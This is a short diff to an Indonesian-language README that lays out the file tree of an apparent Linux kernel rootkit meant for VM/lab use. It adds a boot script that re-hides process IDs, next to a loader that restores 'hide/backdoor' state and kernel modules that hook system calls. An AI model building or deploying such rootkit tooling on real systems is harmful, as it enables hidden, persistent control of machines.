@@ -73,7 +73,8 @@ dan **VM/lab** — bukan server produksi.
 ├── install.sh            # deteksi kernel -> build -> vermagic -> load -> autoload+daemon
 ├── config.example.ini    # template konfigurasi (token diisi sendiri)
 ├── tools/
-│   └── rkit-load.sh      # loader boot: insmod + restore state hide/backdoor
+│   ├── rkit-load.sh      # loader boot: insmod + restore state hide/backdoor
+│   └── rkit-rehide.sh    # auto re-hide PID tiap boot (pola -> pgrep -> hide pid)
 ├── backend/              # modul kernel per-era (Lengkap)
 │   ├── legacy_4x/        #   2.6 -4.19  (sys_call_table + CR0.WP)
 │   ├── modern_5x_6x/     #   5.0 -6.8   (kretprobe/kprobe)  <-- inti
